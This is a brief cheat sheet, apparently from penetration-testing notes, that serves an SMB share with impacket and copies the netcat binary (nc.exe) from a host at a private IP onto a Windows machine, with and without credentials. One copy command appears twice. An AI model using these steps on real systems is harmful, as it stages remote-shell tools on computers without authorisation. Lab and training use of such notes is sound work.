# SMB Downloads

```
sudo impacket-smbserver share -smb2support /tmp/smbshare
```

```
copy \\192.168.220.133\share\nc.exe
```

```
copy \\192.168.220.133\share\nc.exe
```

```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```
net use n: \\192.168.220.133\share /user:test test
```
